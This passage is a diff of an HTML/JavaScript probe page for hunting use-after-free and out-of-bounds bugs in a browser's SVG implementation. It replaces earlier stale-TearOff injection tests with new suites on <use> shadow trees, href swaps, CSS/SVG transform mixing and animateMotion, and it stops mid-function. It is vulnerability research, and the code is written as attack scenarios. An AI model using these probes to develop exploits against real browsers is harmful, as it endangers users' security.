@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v76 — SVGTransformList stale notification deep probe</title>
+<title>SVG UAF v77 — Ultimate: use/shadow UAF + CSS/SVG mix + animateMotion</title>
 <style>
 *{box-sizing:border-box}
 body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
@@ -22,15 +22,16 @@ pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
 </style>
 </head>
 <body>
-<h2>SVG UAF v76 — SVGTransformList stale TearOff: INJECTION TEST</h2>
+<h2>SVG UAF v77 — ULTIMATE: &lt;use&gt; shadow UAF + CSS/SVG mix + animateMotion path UAF</h2>
 <div id="controls">
   <button class="run-all" onclick="runAll()">▶ Run All</button>
-  <button onclick="runSuite('ADR107')">ADR107: removeItem stale → does getAttribute() show injected transform?</button>
-  <button onclick="runSuite('ADR108')">ADR108: removeItem stale → MutationObserver + matrix injection attempt</button>
-  <button onclick="runSuite('ADR109')">ADR109: setAttributeNS stale → does NEW attribute get contaminated?</button>
-  <button onclick="runSuite('ADR110')">ADR110: SVGTransformList animVal TearOff — SMIL + removeItem stale survives?</button>
-  <button onclick="runSuite('ADR111')">ADR111: SVGPointList setAttributeNS stale → attribute injection?</button>
-  <button onclick="runSuite('ADR112')">ADR112: SVGTransformList — stale TearOff after GC pressure → IsoHeap slot reuse?</button>
+  <button onclick="runSuite('ADR113')">ADR113: &lt;use&gt; shadow DOM — remove def, access instanceRoot after GC</button>
+  <button onclick="runSuite('ADR114')">ADR114: &lt;use&gt; href swap mid-animation — shadow tree dangling ref</button>
+  <button onclick="runSuite('ADR115')">ADR115: CSS transform vs SVG transform attribute — mixed TearOff confusion</button>
+  <button onclick="runSuite('ADR116')">ADR116: CSSStyleValue / CSS Typed OM on SVG element — stale after attr change</button>
+  <button onclick="runSuite('ADR117')">ADR117: SVGAnimateMotion — remove path mid-animation + CTM access</button>
+  <button onclick="runSuite('ADR118')">ADR118: animateMotion + mpath href to removed path — dangling mpath ref</button>
+  <button onclick="runSuite('ADR119')">ADR119: SVGAnimatedRect (viewBox) — stale animVal TearOff after removeChild</button>
   <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
   <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
 </div>
@@ -41,6 +42,7 @@ window.onerror=function(msg,src,line,col,err){
   var d=document.getElementById('out');if(d){var p=document.createElement('pre');p.className='miss';p.textContent='[GLOBAL ERR] '+msg+' @ line '+line+(err&&err.stack?'\n'+err.stack:'');d.appendChild(p);d.scrollTop=d.scrollHeight;}return false;
 };
 var SVG_NS='http://www.w3.org/2000/svg';
+var XLINK_NS='http://www.w3.org/1999/xlink';
 function L(s,cls){var d=document.getElementById('out');var p=document.createElement('pre');if(cls)p.className=cls;p.textContent=s;d.appendChild(p);d.scrollTop=d.scrollHeight;}
 function clearOut(){document.getElementById('out').innerHTML='';}
 function copyAll(){
@@ -57,635 +59,771 @@ function timeWrite(writeFn,label,ITER){
   var t1=performance.now();
   var ms=(t1-t0).toFixed(2);
   var us=((t1-t0)*1000/ITER).toFixed(1);
-  L(label+': '+ms+'ms ('+us+'µs/write)','info');
+  L(label+': '+ms+'ms ('+us+'µs/write) '+(t1-t0>0.5?'★ALIVE':''),'info');
   return t1-t0;
-}
-function makeG(n,id){
-  var svg=document.createElementNS(SVG_NS,'svg');
-  if(id)svg.id=id;
-  document.body.appendChild(svg);
-  var g=document.createElementNS(SVG_NS,'g');
-  var transforms=[];
-  for(var i=0;i<n;i++) transforms.push('translate('+(i*10)+','+(i*5)+')');
-  g.setAttribute('transform',transforms.join(' '));
-  svg.appendChild(g);
-  return{svg:svg,g:g};
 }
 var suites={};
 function runSuite(name){L('','');L('══ '+name+' ══════════════════════════════════','suite-hdr');try{suites[name]();}catch(e){L('[SUITE CRASH] '+name+': '+(e&&e.stack?e.stack:String(e)),'miss');}}
-function runAll(){['ADR107','ADR108','ADR109','ADR110','ADR111','ADR112'].forEach(function(n){runSuite(n);});}
+function runAll(){['ADR113','ADR114','ADR115','ADR116','ADR117','ADR118','ADR119'].forEach(function(n){runSuite(n);});}
 
 // ═══════════════════════════════════════════════════════════════
-// ADR107 — SVGTransformList removeItem stale → getAttribute injection
+// ADR113 — <use> shadow DOM: remove def → GC → access instanceRoot
 //
-// ADR101-E confirmed: after removeItem(0), TearOff T_E still fires
-// a 1ms notification when T_E.setTranslate(x, y) is called.
+// SVG <use href="#id"> creates a shadow DOM clone of the referenced
+// element. The shadow tree is kept in sync with the original via
+// a live reference.
 //
-// The KEY question: does the stale TearOff write INJECT data into
-// the transform attribute? Specifically:
+// Attack scenario:
+// 1. Create <defs><g id="tgt">...</g></defs>
+// 2. Create <use href="#tgt"> → shadow DOM built, SVGUseElement.instanceRoot
+//    holds a pointer to the shadow SVGGElement clone
+// 3. Grab instanceRoot → get TearOff refs from shadow tree
+// 4. Remove the <defs> element entirely from DOM
+// 5. Force GC
+// 6. Access instanceRoot — is it still alive? Does it point to freed C++?
+// 7. Access shadow tree TearOff refs — do they crash or show garbage?
 //
-// Step 1: grab T_E = TL.getItem(0)
-// Step 2: TL.removeItem(0) — list now has N-1 items
-// Step 3: T_E.setTranslate(CANARY_X, CANARY_Y) — controlled values
-// Step 4: read g.getAttribute('transform')
-// Step 5: does CANARY_X/CANARY_Y appear in the attribute string?
+// The shadow clone is owned by the <use> element's shadow tree.
+// The original <defs> removal should trigger shadow tree invalidation.
+// If the shadow clone C++ object outlives the original def (ref counting
+// bug), reading it is a UAF.
 //
-// If YES: we can inject arbitrary transform data into the DOM!
-// If YES: the element's transform matrix includes our controlled value!
-//
-// Further: if injection works, we can:
-// - Write a transform that causes OOB in compositing
-// - Use the injected value in SVGMatrix math
-// - Chain with SMIL animation reading the mutated transform
-//
-// Also test: reading T_E.matrix.e/f AFTER stale write — does it
-// reflect our written value (meaning the SVGTransform object itself
-// stores our data)?
+// Also: nested use — <use> of a <use> — doubly-indirect shadow tree.
 // ═══════════════════════════════════════════════════════════════
-suites['ADR107']=function(){
-  L('ADR107: removeItem stale write → does getAttribute() show injected value?','info');
-  var N=10;
-  var CANARY=99999;
-  var o=makeG(N);
-  var TL=o.g.transform.baseVal;
-  var T_E=TL.getItem(0);
+suites['ADR113']=function(){
+  L('ADR113: <use> shadow DOM — remove def after instanceRoot TearOff grab','info');
+  var svg=document.createElementNS(SVG_NS,'svg');
+  svg.setAttribute('width','200');svg.setAttribute('height','200');
+  document.body.appendChild(svg);
 
-  // Read initial state
-  var attrBefore=o.g.getAttribute('transform');
-  L('ADR107: attr BEFORE removeItem: '+attrBefore.substring(0,80),'info');
+  // Build: defs > g#tgt with 5 transforms
+  var defs=document.createElementNS(SVG_NS,'defs');
+  var g=document.createElementNS(SVG_NS,'g');
+  g.setAttribute('id','adr113_tgt');
+  g.setAttribute('transform','translate(10,0) translate(20,0) translate(30,0) translate(40,0) translate(50,0)');
+  defs.appendChild(g);
+  svg.appendChild(defs);
 
-  // removeItem
-  TL.removeItem(0);
-  var attrAfterRemove=o.g.getAttribute('transform');
-  L('ADR107: attr AFTER removeItem: '+attrAfterRemove.substring(0,80),'info');
-  L('ADR107: list length after removeItem: '+TL.numberOfItems,'info');
+  // Build <use>
+  var use=document.createElementNS(SVG_NS,'use');
+  use.setAttribute('href','#adr113_tgt');
+  svg.appendChild(use);
 
-  // One stale write with canary value
-  T_E.setTranslate(CANARY, CANARY*2);
+  // Force layout to build shadow tree
+  var ctm0=use.getScreenCTM();
+  L('ADR113: use.getScreenCTM() = '+(ctm0?'OK':'null'),'info');
 
-  // Check T_E.matrix.e after write (is the value stored in the SVGTransform?)
-  var storedTx=T_E.matrix.e;
-  var storedTy=T_E.matrix.f;
-  L('ADR107: T_E.matrix.e='+storedTx+' .f='+storedTy+' (expected '+CANARY+','+(CANARY*2)+')','info');
-  if(Math.abs(storedTx-CANARY)<1){
-    L('ADR107: ★ T_E.matrix.e = CANARY! Write stored in SVGTransform object.','hit');
-  }
+  // Access instanceRoot (shadow tree root)
+  var ir=use.instanceRoot;
+  L('ADR113: instanceRoot = '+(ir?ir.tagName:'null'),'info');
 
-  // Check if getAttribute changed
-  var attrAfterStale=o.g.getAttribute('transform');
-  L('ADR107: attr AFTER stale write: '+attrAfterStale.substring(0,120),'info');
+  // Try to grab transform TearOff from the SHADOW g element
+  var shadowG=null;
+  var shadowTL=null, shadowT=null;
+  try{
+    // instanceRoot might BE the shadow g, or we need to traverse
+    if(ir&&ir.correspondingElement){
+      L('ADR113: ir.correspondingElement = '+ir.correspondingElement.id,'info');
+    }
+    // The shadow tree: use.shadowRoot won't work (closed shadow),
+    // but instanceRoot gives us the shadow SVGGElement
+    shadowG=ir;
+    if(shadowG&&shadowG.transform){
+      shadowTL=shadowG.transform.baseVal;
+      L('ADR113: shadow TL.numberOfItems = '+shadowTL.numberOfItems,'info');
+      shadowT=shadowTL.getItem(0);
+      L('ADR113: shadow T[0].tx = '+shadowT.matrix.e,'info');
+    }
+  }catch(e){L('ADR113: shadow access threw: '+e.message,'warn');}
 
-  // Does the attribute contain CANARY?
-  if(attrAfterStale.indexOf(String(CANARY))!==-1){
-    L('★★★ ADR107: CANARY VALUE INJECTED INTO ATTRIBUTE! attr contains '+CANARY,'hit');
-    L('ADR107: FULL INJECTED ATTR: '+attrAfterStale,'hit');
-  } else {
-    L('ADR107: No CANARY in attribute. Stale write did not inject into attr.','info');
-  }
+  // Now remove the <defs> — this should invalidate the shadow tree
+  svg.removeChild(defs);
+  L('ADR113: defs removed from DOM','info');
 
-  // Check the SVGTransformList items — did a new item appear?
-  L('ADR107: list items after stale write:','info');
-  for(var i=0;i<TL.numberOfItems;i++){
-    var t=TL.getItem(i);
-    L('  item['+i+']: tx='+t.matrix.e.toFixed(2)+' ty='+t.matrix.f.toFixed(2),'info');
-  }
+  // Force GC
+  try{
+    var gcArr=[];
+    for(var i=0;i<50000;i++) gcArr.push(new Uint8Array(256));
+    gcArr=null;
+    if(window.gc) window.gc();
+  }catch(e){}
+  L('ADR113: GC applied','info');
 
-  // Did the element's computed transform change?
-  var ctm=o.g.getScreenCTM();
-  if(ctm){
-    L('ADR107: element CTM.e='+ctm.e.toFixed(2)+' .f='+ctm.f.toFixed(2),'info');
-    if(Math.abs(ctm.e-CANARY)<100||Math.abs(ctm.f-CANARY*2)<100){
-      L('★★★ ADR107: CTM CONTAINS CANARY! Element transform was affected!','hit');
+  // Now check instanceRoot after def removal + GC
+  var ir2=null;
+  try{ir2=use.instanceRoot;}catch(e){L('ADR113: instanceRoot threw after GC: '+e.message,'warn');}
+  L('ADR113: instanceRoot after GC = '+(ir2?ir2.tagName:'null'),'info');
+
+  // Access shadow TearOff after def removal
+  if(shadowT){
+    var txAfter=-999;
+    try{txAfter=shadowT.matrix.e;}catch(e){L('ADR113: shadowT.matrix.e threw: '+e.message,'warn');}
+    L('ADR113: shadowT.matrix.e after def removal = '+txAfter,'info');
+
+    // Time stale write on shadow TearOff
+    var t=timeWrite(function(i){shadowT.setTranslate(i,i);},'ADR113: shadow TearOff write after def removal',500);
+    if(t>0.5){
+      L('★★★ ADR113: SHADOW TEAROFF SURVIVES DEF REMOVAL! C++ ref count bug!','hit');
+    } else {
+      L('ADR113: shadow TearOff dead after def removal (safe)','info');
     }
   }
 
-  // Multiple stale writes — exhaustive
-  var ITER=500;
-  var t0=performance.now();
-  for(var i=0;i<ITER;i++) T_E.setTranslate(i*0.1+CANARY, i*0.2);
-  var t1=performance.now();
-  L('ADR107: 500 stale writes: '+(t1-t0).toFixed(2)+'ms (CONFIRM: '+(t1-t0>0.5?'★ALIVE':'dead')+')','info');
-
-  var attrFinal=o.g.getAttribute('transform');
-  L('ADR107: attr AFTER 500 stale writes: '+attrFinal.substring(0,120),'info');
-  if(attrFinal!==attrAfterRemove){
-    L('★★★ ADR107: ATTRIBUTE CHANGED BY STALE WRITES!','hit');
-    L('ADR107: changed from: '+attrAfterRemove.substring(0,60),'warn');
-    L('ADR107:      changed to: '+attrFinal.substring(0,60),'warn');
+  // Also: access the shadow TL itself
+  if(shadowTL){
+    var nAfter=-1;
+    try{nAfter=shadowTL.numberOfItems;}catch(e){L('ADR113: shadowTL.numberOfItems threw: '+e.message,'warn');}
+    L('ADR113: shadowTL.numberOfItems after def removal = '+nAfter,'info');
   }
 
-  o.svg.remove();
+  // Check if ir still accessible and if its transform is accessible
+  if(ir){
+    try{
+      var irTx=ir.transform?ir.transform.baseVal.getItem(0).matrix.e:'no transform';
+      L('ADR113: ir.transform[0].tx after def removal = '+irTx,'info');
+    }catch(e){L('ADR113: ir.transform access threw: '+e.message,'warn');}
+  }
+
+  svg.remove();
 };
 
 // ═══════════════════════════════════════════════════════════════
-// ADR108 — MutationObserver + SVGMatrix controlled injection
+// ADR114 — <use> href SWAP mid-animation
 //
-// If the attribute changes, MutationObserver fires. We use this to:
-// 1. Confirm the exact moment of attribute mutation
-// 2. Measure how many stale writes it takes to trigger mutation
-// 3. Get the exact injected value
+// Create <use href="#A">, then mid-animation (rAF loop) change href to "#B".
+// The shadow tree is rebuilt. If the old shadow tree is not fully
+// torn down before the new one is built, we might have:
+// - TearOff refs to old shadow elements while new shadow is being built
+// - Old shadow element C++ objects being freed while JS still holds refs
 //
-// Also: SVGTransform.setMatrix(SVGMatrix) — allows setting full
-// 6-float matrix at once. More control than setTranslate.
-// setMatrix(m) with m.a=TARGET_VALUE — does the 'a' value inject?
+// Specifically:
+// 1. Build #A (5 transforms) and #B (3 transforms) in defs
+// 2. Create <use href="#A">, grab instanceRoot, grab TearOff from shadow T[4]
+// 3. In rAF: set href="#B" (rebuilds shadow tree)
+// 4. Immediately after: access shadow T[4] (now OOB! B only has 3 items)
+// 5. Check instanceRoot — is it A's or B's shadow root?
+// 6. Time stale writes on old shadow TearOff
 //
-// Additionally: test with EXTREME float values:
-// T_E.setMatrix({a:1e38, b:0, c:0, d:1, e:0, f:0})
-// Does SVGMatrix accept extreme values? Does serialization overflow?
+// This tests whether href invalidation properly tears down old TearOffs.
 // ═══════════════════════════════════════════════════════════════
-suites['ADR108']=function(){
-  L('ADR108: MutationObserver + SVGMatrix controlled injection','info');
-  var N=10;
-  var o=makeG(N);
-  var TL=o.g.transform.baseVal;
-  var T_E=TL.getItem(0);
+suites['ADR114']=function(){
+  L('ADR114: <use> href swap mid-animation — shadow tree dangling ref','info');
+  var svg=document.createElementNS(SVG_NS,'svg');
+  document.body.appendChild(svg);
+  var defs=document.createElementNS(SVG_NS,'defs');
 
-  // Set up MutationObserver BEFORE removeItem
-  var mutations=[];
-  var mo=new MutationObserver(function(recs){
-    recs.forEach(function(r){
-      mutations.push({
-        old:r.oldValue,
-        new:o.g.getAttribute('transform')
-      });
-    });
+  // Def A: 5 transforms
+  var gA=document.createElementNS(SVG_NS,'g');
+  gA.setAttribute('id','adr114_A');
+  gA.setAttribute('transform','translate(100,0) translate(200,0) translate(300,0) translate(400,0) translate(500,0)');
+  defs.appendChild(gA);
+
+  // Def B: 3 transforms (SHORTER — forces OOB if old index accessed)
+  var gB=document.createElementNS(SVG_NS,'g');
+  gB.setAttribute('id','adr114_B');
+  gB.setAttribute('transform','translate(1,0) translate(2,0) translate(3,0)');
+  defs.appendChild(gB);
+  svg.appendChild(defs);
+
+  var use=document.createElementNS(SVG_NS,'use');
+  use.setAttribute('href','#adr114_A');
+  svg.appendChild(use);
+
+  // Force layout to build shadow tree for A
+  use.getBoundingClientRect();
+
+  // Grab shadow TearOff for A[4] (index 4 — will be OOB after swap to B)
+  var irA=use.instanceRoot;
+  L('ADR114: irA = '+(irA?irA.tagName:'null'),'info');
+  var shadowTA4=null;
+  try{
+    var shadowTLA=irA.transform.baseVal;
+    L('ADR114: shadowTLA.numberOfItems = '+shadowTLA.numberOfItems,'info');
+    shadowTA4=shadowTLA.getItem(4);// item index 4 (last item of A)
+    L('ADR114: shadowTA4.tx = '+shadowTA4.matrix.e,'info');// 500
+  }catch(e){L('ADR114: shadowTA4 grab threw: '+e.message,'warn');}
+
+  // rAF: swap href to B
+  requestAnimationFrame(function(){
+    use.setAttribute('href','#adr114_B');
+    // Force layout immediately
+    use.getBoundingClientRect();
+
+    var irB=use.instanceRoot;
+    L('ADR114 f1: irB after swap = '+(irB?irB.tagName:'null'),'info');
+    try{
+      var shadowTLB=irB?irB.transform.baseVal:null;
+      if(shadowTLB) L('ADR114 f1: shadowTLB.numberOfItems = '+shadowTLB.numberOfItems,'info');
+    }catch(e){L('ADR114 f1: shadowTLB threw: '+e.message,'warn');}
+
+    // Access OLD shadow TearOff after swap
+    if(shadowTA4){
+      var txOld=-999;
+      try{txOld=shadowTA4.matrix.e;}catch(e){L('ADR114 f1: shadowTA4.matrix.e threw: '+e.message,'warn');}
+      L('ADR114 f1: shadowTA4.tx after href swap = '+txOld,'info');
+
+      // Is irA still the same as irB?
+      L('ADR114 f1: irA === irB? '+(irA===irB),'info');
+      if(irA&&irB&&irA!==irB){
+        L('ADR114: ★ irA !== irB — shadow root was REPLACED. Old shadow tree freed?','warn');
+      }
+
+      // Write to old shadow TearOff
+      var t=timeWrite(function(i){shadowTA4.setTranslate(i+55555,i);},'ADR114: old shadow TearOff write after href swap',500);
+      if(t>0.5){
+        L('★★★ ADR114: OLD SHADOW TEAROFF ALIVE AFTER HREF SWAP!','hit');
+        L('★★★ ADR114: Writing to A[4] TearOff while B (only 3 items) is active = OOB!','hit');
+      } else {
+        L('ADR114: old shadow TearOff dead after swap (safe)','info');
+      }
+
+      // Read back shadowTA4 after writes
+      try{L('ADR114: shadowTA4.tx AFTER writes = '+shadowTA4.matrix.e,'info');}catch(e){}
+    }
+
+    svg.remove();
   });
-  mo.observe(o.g,{attributes:true,attributeFilter:['transform'],attributeOldValue:true});
-
-  // removeItem(0)
-  TL.removeItem(0);
-  var moCountAfterRemove=mutations.length;
-  L('ADR108: MO fires from removeItem: '+moCountAfterRemove,'info');
-
-  // Single stale write via setMatrix
-  var svg_matrix=o.svg.createSVGMatrix();
-  // setMatrix with controlled values (a, b, c, d = identity, e, f = translation)
-  // matrix.e = tx, matrix.f = ty
-  svg_matrix.e=123456.789;
-  svg_matrix.f=654321.0;
-  T_E.setMatrix(svg_matrix);
-  var moCountAfterMatrix=mutations.length;
-  L('ADR108: MO fires from stale setMatrix: '+(moCountAfterMatrix-moCountAfterRemove),'info');
-  if(moCountAfterMatrix>moCountAfterRemove){
-    L('★★★ ADR108: MutationObserver FIRED from stale setMatrix!','hit');
-    mutations.slice(moCountAfterRemove).forEach(function(m,i){
-      L('  MO mutation '+i+': attr='+m.new.substring(0,80),'hit');
-    });
-  }
-
-  var attrAfterMatrix=o.g.getAttribute('transform');
-  L('ADR108: attr after stale setMatrix: '+attrAfterMatrix.substring(0,120),'info');
-  if(attrAfterMatrix.indexOf('123456')!==-1){
-    L('★★★ ADR108: INJECTED 123456! Matrix value in attribute!','hit');
-  }
-
-  // Extreme values
-  var svg_matrix2=o.svg.createSVGMatrix();
-  svg_matrix2.a=1e38;
-  svg_matrix2.d=1e38;
-  svg_matrix2.e=1e38;
-  svg_matrix2.f=1e38;
-  try{
-    T_E.setMatrix(svg_matrix2);
-    var attrExtreme=o.g.getAttribute('transform');
-    L('ADR108: attr after extreme matrix: '+attrExtreme.substring(0,120),'info');
-    if(attrExtreme.indexOf('e+38')!==-1||attrExtreme.indexOf('Inf')!==-1||attrExtreme.indexOf('NaN')!==-1){
-      L('★★★ ADR108: EXTREME VALUES IN ATTRIBUTE!','hit');
-    }
-  }catch(e){L('ADR108: setMatrix extreme threw: '+e.message,'warn');}
-
-  // setRotate with controlled angle, cx, cy
-  // SVGTransform.setRotate(angle, cx, cy) — 3 parameters
-  // If angle is injected, we can potentially control rotation math
-  try{
-    T_E.setRotate(987654.321, 111111, 222222);
-    var attrRotate=o.g.getAttribute('transform');
-    L('ADR108: attr after stale setRotate: '+attrRotate.substring(0,120),'info');
-    if(attrRotate.indexOf('987654')!==-1){
-      L('★★★ ADR108: INJECTED rotation angle 987654 into attribute!','hit');
-    }
-  }catch(e){L('ADR108: setRotate threw: '+e.message,'warn');}
-
-  // setScale, setSkewX, setSkewY
-  try{
-    T_E.setScale(55555, 66666);
-    var attrScale=o.g.getAttribute('transform');
-    L('ADR108: attr after stale setScale: '+attrScale.substring(0,120),'info');
-  }catch(e){L('ADR108: setScale threw: '+e.message,'warn');}
-
-  L('ADR108: total MO mutations: '+mutations.length,'info');
-  mo.disconnect();
-  o.svg.remove();
 };
 
 // ═══════════════════════════════════════════════════════════════
-// ADR109 — setAttributeNS stale → does NEW attribute get contaminated?
+// ADR115 — CSS transform vs SVG transform attribute: mixed TearOff
 //
-// ADR101-A confirmed: setAttributeNS → stale TearOff ALIVE (1ms).
+// SVG elements can have transforms from TWO sources:
+// 1. SVG attribute: g.setAttribute('transform', 'translate(100,0)')
+//    → accessed via g.transform.baseVal (SVGTransformList TearOff)
+// 2. CSS property: g.style.transform = 'translateX(200px)'
+//    → accessed via CSS CSSOM (completely separate C++ path)
 //
-// Scenario:
-// 1. Grab T_A = TL.getItem(0) on 10-item list
-// 2. g.setAttributeNS(null, 'transform', 'scale(2)') — NEW list (1 item)
-// 3. T_A.setTranslate(CANARY, CANARY) — stale write → notification fires
-// 4. What does getAttribute() return?
-//    a) 'scale(2)' — unaffected (stale write went nowhere useful)
-//    b) 'scale(2) translate(CANARY, CANARY)' — INJECTION!
-//    c) Something else entirely (C++ memory corruption visible)
+// These two systems COEXIST. WebKit must merge them for rendering.
+// The "transform" property in CSS overrides the SVG attribute in
+// CSS cascade, but the SVG attribute still exists in the DOM.
 //
-// This is KEY: if setting new attribute creates a NEW SVGTransformList
-// object but T_A's TearOff still has a raw pointer to the OLD list,
-// writing T_A fires a notification through the OLD list → the OLD list
-// notifies the element → element might use OLD list data for setAttribute.
+// Attack:
+// 1. Create <g> with SVG transform attribute (10 items)
+// 2. Grab SVG TearOff T_svg = TL.getItem(0)
+// 3. Set CSS style.transform → CSS system takes over for rendering
+// 4. Now removeItem(0) from SVG TL → T_svg is stale
+// 5. Do T_svg.setTranslate() → does the notification fire differently?
+//    Because now CSS is the authoritative transform, does the SVG
+//    TearOff notification go through a DIFFERENT path?
 //
-// This would be a classic use-after-"attribution" bug.
+// Also: CSS Typed OM for transforms:
+// g.attributeStyleMap.set('transform', new CSSTranslate(...))
+// Then g.transform.baseVal — does the SVG TL reflect the CSS value?
 //
-// Also test: what does TL (JS ref to baseVal) say after setAttributeNS?
-// Does TL.numberOfItems reflect the new attribute (1) or the old (10)?
+// Also: after CSS transform set, does g.transform.animVal differ from
+// g.transform.baseVal? Normally they're the same without animation.
+// With CSS transform overriding, does animVal see CSS value while
+// baseVal sees SVG attribute? Potential divergence = OOB.
 // ═══════════════════════════════════════════════════════════════
-suites['ADR109']=function(){
-  L('ADR109: setAttributeNS stale TearOff → new attribute contamination?','info');
-  var N=10;
-  var CANARY=77777;
-  var o=makeG(N);
-  var TL_old=o.g.transform.baseVal;// reference to ORIGINAL list
-  var T_A=TL_old.getItem(0);// T_A wraps old list item[0]
-
-  L('ADR109: initial attr: '+o.g.getAttribute('transform').substring(0,80),'info');
-  L('ADR109: TL_old.numberOfItems='+TL_old.numberOfItems,'info');
-
-  // Change the attribute entirely
-  o.g.setAttributeNS(null,'transform','scale(2)');
-  var attrNew=o.g.getAttribute('transform');
-  L('ADR109: attr after setAttributeNS: '+attrNew,'info');
-
-  // What does TL_old say now? Does it reflect new attr?
-  var TL_new=o.g.transform.baseVal;// fresh ref
-  L('ADR109: TL_old.numberOfItems after setAttr: '+TL_old.numberOfItems,'info');
-  L('ADR109: TL_new.numberOfItems: '+TL_new.numberOfItems,'info');
-  if(TL_old.numberOfItems!==TL_new.numberOfItems){
-    L('ADR109: ★ TL_old and TL_new have DIFFERENT item counts! Old list is stale!','hit');
-    L('ADR109: OLD list has '+TL_old.numberOfItems+' items, NEW list has '+TL_new.numberOfItems,'hit');
-  }
-
-  // T_A write → does it hit old or new list?
-  // Write canary
-  T_A.setTranslate(CANARY, CANARY*2);
-  var attrAfterStale=o.g.getAttribute('transform');
-  L('ADR109: attr after stale setTranslate: '+attrAfterStale,'info');
-
-  if(attrAfterStale.indexOf(String(CANARY))!==-1){
-    L('★★★ ADR109: CANARY INJECTED into new attribute! '+attrAfterStale,'hit');
-  } else if(attrAfterStale!==attrNew){
-    L('★★★ ADR109: Attribute CHANGED by stale write (different from post-setAttr)!','hit');
-    L('ADR109: was: '+attrNew,'warn');
-    L('ADR109: now: '+attrAfterStale,'warn');
-  } else {
-    L('ADR109: attr unchanged by stale write. ('+attrAfterStale+')','info');
-  }
-
-  // Check what TL_old items say now
-  L('ADR109: TL_old items after stale write:','info');
-  try{
-    for(var i=0;i<TL_old.numberOfItems;i++){
-      var t=TL_old.getItem(i);
-      L('  TL_old['+i+']: tx='+t.matrix.e.toFixed(2)+' ty='+t.matrix.f.toFixed(2),'info');
-    }
-  }catch(e){L('ADR109: TL_old.getItem threw: '+e.message,'warn');}
-
-  // MO test for this scenario
-  var mutations109=[];
-  var mo109=new MutationObserver(function(recs){
-    recs.forEach(function(r){mutations109.push(o.g.getAttribute('transform'));});
-  });
-  // Reset: fresh g element
-  var o2=makeG(N);
-  var TL2=o2.g.transform.baseVal;
-  var T2=TL2.getItem(0);
-  mo109.observe(o2.g,{attributes:true,attributeFilter:['transform']});
-  o2.g.setAttributeNS(null,'transform','rotate(45)');
-  var mutsAfterSetAttr=mutations109.length;
-  L('ADR109: MO fires from setAttributeNS: '+mutsAfterSetAttr,'info');
-  // Now stale write
-  T2.setTranslate(CANARY, CANARY);
-  var mutsAfterStale=mutations109.length;
-  L('ADR109: MO fires from stale setTranslate: '+(mutsAfterStale-mutsAfterSetAttr),'info');
-  if(mutsAfterStale>mutsAfterSetAttr){
-    L('★★★ ADR109: MO FIRED from stale write after setAttributeNS!','hit');
-    L('ADR109: attr at that moment: '+mutations109[mutations109.length-1],'hit');
-  }
-  var t0=performance.now();
-  for(var j=0;j<500;j++) T2.setTranslate(j+CANARY, j);
-  var t1=performance.now();
-  L('ADR109: 500 stale writes after setAttr: '+(t1-t0).toFixed(2)+'ms','info');
-  mo109.disconnect();
-  o.svg.remove();
-  o2.svg.remove();
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR110 — SVGTransformList animVal TearOff after SMIL + removeItem
-//
-// For SVGNumberList:
-// - animVal TearOff = read-only (throw on animVal.removeItem)
-// - animVal TearOff context nulled on anim.remove(), to= change, etc.
-//
-// For SVGTransformList with SMIL animateTransform:
-// - Does animVal have the same read-only restriction?
-// - After removeItem from BASEVAL, does the animVal TearOff survive?
-// - Can we grab animVal TearOff during animation and write to it after anim ends?
-//
-// SVGTransformList has additive animation. The animVal might be a
-// computed combination of baseVal + animation offset. Removing from
-// baseVal and writing to animVal TearOff might cause:
-// - OOB in the additive computation
-// - Stale animVal that refs freed baseVal data
-//
-// Plan:
-// 1. Create g with 5 translate transforms
-// 2. Add animateTransform (type=translate, additive=sum)
-// 3. Grab T_av = animVal.getItem(4) during animation
-// 4. removeItem(4) from baseVal → baseVal shrinks to 4 items
-// 5. Check T_av.matrix.e — does it still read from animVal[4]?
-// 6. Time T_av writes — does animVal TearOff survive after baseVal removeItem?
-// ═══════════════════════════════════════════════════════════════
-suites['ADR110']=function(){
-  L('ADR110: SVGTransformList animVal TearOff — SMIL + baseVal removeItem','info');
-  var svg=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg);
+suites['ADR115']=function(){
+  L('ADR115: CSS transform vs SVG transform — mixed TearOff confusion','info');
+  var svg=document.createElementNS(SVG_NS,'svg');
+  document.body.appendChild(svg);
   var g=document.createElementNS(SVG_NS,'g');
   g.setAttribute('transform','translate(100,0) translate(200,0) translate(300,0) translate(400,0) translate(500,0)');
   svg.appendChild(g);
-  var anim=document.createElementNS(SVG_NS,'animateTransform');
-  anim.setAttribute('attributeName','transform');
-  anim.setAttribute('type','translate');
-  anim.setAttribute('from','0,0');
-  anim.setAttribute('to','1000,0');
-  anim.setAttribute('dur','10s');
-  anim.setAttribute('repeatCount','indefinite');
-  anim.setAttribute('additive','sum');
-  g.appendChild(anim);
 
-  var T_av4=null, T_bv4=null;
-  var frame=0;
-  function tick(){
-    var bvN=g.transform.baseVal.numberOfItems;
-    var avN=g.transform.animVal.numberOfItems;
-    if(frame===1){
-      // Grab animVal[4] and baseVal[4] during animation
-      T_av4=g.transform.animVal.getItem(avN-1);
-      T_bv4=g.transform.baseVal.getItem(bvN-1);
-      L('ADR110 f1: bv='+bvN+' av='+avN,'info');
-      L('ADR110 f1: T_av4.tx='+T_av4.matrix.e.toFixed(2)+' T_bv4.tx='+T_bv4.matrix.e.toFixed(2),'info');
+  var TL_svg=g.transform.baseVal;
+  var T0=TL_svg.getItem(0);// T0.tx = 100
+  L('ADR115: SVG TL.numberOfItems = '+TL_svg.numberOfItems,'info');
+  L('ADR115: T0.tx = '+T0.matrix.e,'info');
+
+  // Set CSS transform (this overrides SVG for rendering)
+  g.style.transform='translateX(9999px)';
+  L('ADR115: CSS transform set','info');
+
+  // Check if SVG TL is affected
+  L('ADR115: TL after CSS set: numberOfItems = '+TL_svg.numberOfItems,'info');
+  L('ADR115: T0.tx after CSS set = '+T0.matrix.e,'info');
+
+  // Baseline: does writing T0 still fire a notification with CSS active?
+  var tBase=timeWrite(function(i){T0.setTranslate(i,i);},'ADR115: baseline SVG TearOff write WITH CSS override',500);
+
+  // Now removeItem(0) — T0 becomes stale
+  TL_svg.removeItem(0);
+  L('ADR115: removeItem(0) done. TL.numberOfItems = '+TL_svg.numberOfItems,'info');
+
+  // Stale write with CSS still active
